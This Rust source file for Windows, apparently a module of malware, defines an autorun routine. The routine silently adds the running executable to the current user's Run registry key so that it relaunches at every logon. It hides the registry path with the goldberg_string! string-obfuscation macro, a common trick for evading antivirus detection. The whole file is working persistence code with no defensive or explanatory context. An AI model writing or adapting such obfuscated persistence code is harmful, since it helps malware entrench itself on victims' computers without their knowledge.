use goldberg::goldberg_string;
use std::env;
use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use winreg::{
    enums::{RegType, HKEY_CURRENT_USER, KEY_READ, KEY_WRITE},
    RegKey, RegValue,
};

pub fn autorun() {
    let app_path = env::current_exe().unwrap();
    let app_path_str = app_path.to_str().unwrap();

    let app_name = app_path.file_name().unwrap();
    let app_name_str = app_name.to_str().unwrap();

    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    // let run_key_path =  goldberg_string!(r"Software\Microsoft\Windows\CurrentVersion\Run");

    let key_exists = hkcu
        .open_subkey_with_flags(
            goldberg_string!(r"Software\Microsoft\Windows\CurrentVersion\Run"),
            KEY_READ,
        )
        .and_then(|run_key| run_key.get_value::<String, _>(app_name_str))
        .is_ok();

    if !key_exists {
        let mut run_key = hkcu
            .create_subkey_with_flags(
                goldberg_string!(r"Software\Microsoft\Windows\CurrentVersion\Run"),
                KEY_WRITE,
            )
            .unwrap();
        let reg_value = RegValue {
            vtype: RegType::REG_SZ,
            bytes: OsStr::new(app_path_str)
                .encode_wide()
                .chain(Some(0))
                .flat_map(|wide_char| wide_char.to_le_bytes())
                .collect(),
        };
        run_key.0.set_raw_value(app_name_str, &reg_value).unwrap();
    } else {
    }
}
